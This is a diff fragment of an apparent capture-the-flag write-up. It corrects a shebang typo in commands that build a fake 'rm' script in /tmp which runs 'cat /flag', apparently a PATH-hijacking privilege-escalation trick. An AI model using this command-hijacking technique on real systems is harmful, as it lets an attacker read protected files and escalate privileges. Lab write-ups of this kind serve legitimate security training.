@@ -8,7 +8,7 @@ How can you solve this? You know that `rm` is searched for in the directories 
 
 Command used: 
 
-`echo "!#/bin/bash" >> /tmp/rm`
+`echo "#!/bin/bash" >> /tmp/rm`
 
 `echo "cat /flag" >> /tmp/rm`
 
